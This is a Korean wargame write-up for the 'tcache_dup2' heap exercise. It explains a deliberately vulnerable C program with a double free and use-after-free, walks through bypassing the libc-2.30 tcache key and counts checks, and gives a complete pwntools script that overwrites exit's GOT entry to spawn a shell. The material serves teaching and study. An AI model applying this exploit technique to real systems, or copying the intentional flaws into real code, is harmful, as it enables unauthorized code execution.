# Exercise: tcache_dup2

# 들어가며

## 서론

---

tcache 관련 보안 기법이 적용된 환경에서 일어나는 단순한 형태의 **double free bug**를 실습해보자.

## 문제 목표 및 기능

---

이 문제에서는 사용자가 임의의 tcache를 할당 받고 해제할 수 있기 때문에, 해제된 tcache를 다시 해제하는 것으로 double free bug를 일으킬 수 있다. 해당 취약점을 이용해 GOT overwrite를 실행할 수 있고, 바이너리 내에 내장된 get_shell() 함수로 실행 흐름을 변경하여 셸을 획득할 수 있다.

이문제는 **Ubuntu 19.10** 운영체제 및 **libc-2.30**을 이용해 구성되었다.

이전의 문제들과 달리 우분투 버전과 라이브러리 버전이 올라있다. 따라서 다른 tcache 보호 기법이 적용되어 있다.

# 분석 및 설계

## 분석

---

### 보호 기법

```c
[*]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

실습 환경에는 **ASLR**이 적용되어 있고, 바이너리에는 **NX** 및 **Canary**가 적용되어 있다. **PIE**는 적용되지 않았다.

또한 Partial RELRO가 적용되어 있어 GOT overwrite가 가능하다. PIE가 적용되지 않았기 때문에, 추가적인 과정 없이 바이너리 내의 함수 혹은 가젯 주소를 쉽게 이용할 수 있다.

### 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx) {
    size_t size;

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    ptr[idx] = malloc(size);

    if (!ptr[idx])
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size-1);
}

void modify_heap() {
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap() {
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}
int main() {
    int idx;
    int i = 0;

    initialize();

    while (1) {
        printf("1. Create heap\n");
        printf("2. Modify heap\n");
        printf("3. Delete heap\n");
        printf("> ");

        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create_heap(i);
                i++;
                break;
            case 2:
                modify_heap();
                break;
            case 3:
                delete_heap();
                break;
            default:
                break;
        }
    }
}
```

이전 실습 문제와 동작이 거의 유사하다. 이번 실습에서는, modify_heap()이라는 함수가 추가되어 힙 내부의 청크를 수정할 수 있다.

**create_heap()**

malloc()을 이용해 사용자에게서 요청 받은 사이즈의 힙 메모리를 할당 받고, 해당 메모리 주소를 ptr 배열에 저장한 이후 그 크기 만큼의 데이터를 입력 받는다.

**modify_heap()**

ptr 배열의 인덱스 값과 사이즈를 사용자에게서 입력 받고, 해당 공간에 저장된 메모리 주소의 동적 메모리의 데이터를 수정한다. **이 때, 메모리가 해제된 이후에도 해당 동적 메모리의 데이터를 수정할 수 있다.**

**delete_heap()**

ptr 배열의 인덱스 값을 사용자에게 입력 받고, 해당 공간에 저장된 메모리 주소의 동적 메모리를 해제한다. **이 때, 해제 과정에서 기존 해제 여부를 확인하는 검사가 수행되지 않기 때문에 double free bug가 발생한다.**

# 익스플로잇

## 익스플로잇

---

### 취약점 분석

**Double free bug**

저번 실습과 비슷한 방식으로 익스플로잇 하는 것을 생각해볼 수 있다. 이 때 tcache의 key가 이번 실습에는 있으므로 key값을 바꾸기 위해 modify 함수를 통해 key값을 변경하여도 익스플로잇이 되지 않는다.

### Mitigation - tcache → counts[tc_idx]

libc-2.30의 malloc.c 소스코드에서, 동적 할당과 관련된 함수인 __libc_malloc()을 확인해보면 다음과 같이 tcache 할당 관련 코드를 찾을 수 있다.

```c
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      return tcache_get (tc_idx);
    }
```

이 코드의 의미는 다음과 같다.

- tc_idx < mp_.tcache_bins : 요청 크기가 tcache 범위 안인지 (0x20~0x410)
- tcache : tcache 구조체가 초기화되어 있는지
- tcache → counts[tc_idx] > 0 : 해당 크기 bin에 free chunk가 있는지

여기서 tcache → counts[tc_idx]는 해제가 일어나 tcache에 청크가 추가될 때는 증가하고, 할당이 일어나 tcache에서 청크가 제거될 때는 감소한다.

원래 익스플로잇을 했던 과정을 생각해보면, double free bug를 일으키기 위해서, 2번 해제를 하고, 할당을 두번 한뒤에 원하는 청크를 꺼낼 수 있으므로, tcache 내부의 청크 개수보다 많은 할당을 하게된다. 따라서 저번 실습처럼 익스플로잇을 하게되면 익스플로잇이 제대로 일어나지 않는다.

따라서 익스플로잇을 위해서는 초기 상태에서 tcachebin에 대하여 충분한 할당을 하여, tcache→counts[tc_idx]의 값이 양수가 되도록 해야 한다.

### 익스플로잇 시나리오

1. 0x10 사이즈에 해당하는 메모리를 3개 할당
2. 1. 에서 할당 받은, ptr의 2, 1, 0번 인덱스에 저장된 메모리를 순서대로 tcache에 해제 (0번 인덱스의 tcache chunk를 공격에 사용)
3. 0번 인덱스에 저장된 tcache chunk의 key 값을 덮어쓰기
4. 0번 인덱스에 저장된 메모리를 다시 한 번 해제하여 tcache에 double free bug 트리거
5. 0x10 사이즈에 해당하는 메모리를 tcache에서 할당. 이 때 exit()의 GOT 주소를 전달
6. 0x10 사이즈에 해당하는 메모리를 tcache에서 할당
7. 0x10 사이즈에 해당하는 메모리를 tcache에서 할당한 뒤, get_shell()의 주소를 전달
8. exit()를 실행하여 셸 획득

이 때 free를 사용하는게 아닌 exit를 사용하는 이유는 안정적으로 익스플로잇하기 위해서이다.
printf 함수에서 내부 버퍼를 관리할 때 malloc/free를 호출하는 경우가 있기 때문에 exit를 사용한다.

### 익스플로잇 코드

```c
#!/usr/bin/env python3
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./tcache_dup2', env={'LD_PRELOAD': './libc-2.30.so'})

e = ELF('./tcache_dup2')
libc = ELF('./libc-2.30.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

# 1. setup tcache->counts[tc_idx]
create(0x10, b'AAAAAAAA')
create(0x10, b'BBBBBBBB')
create(0x10, b'CCCCCCCC')
delete(2)
delete(1)
delete(0)
# 2. overwrite key to bypass mitigation
modify(0, 16, b'AAAAAAAAAAAAAAAA')
# 3. trigger double free bug
delete(0)
# 4. aaw to exit_got with get_shell
create(0x10, p64(e.got['exit']))
create(0x10, b'BBBBBBBB')
create(0x10, p64(e.symbols['get_shell']))
# 5. trigger exit() to get shell
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'7')

p.interactive()
```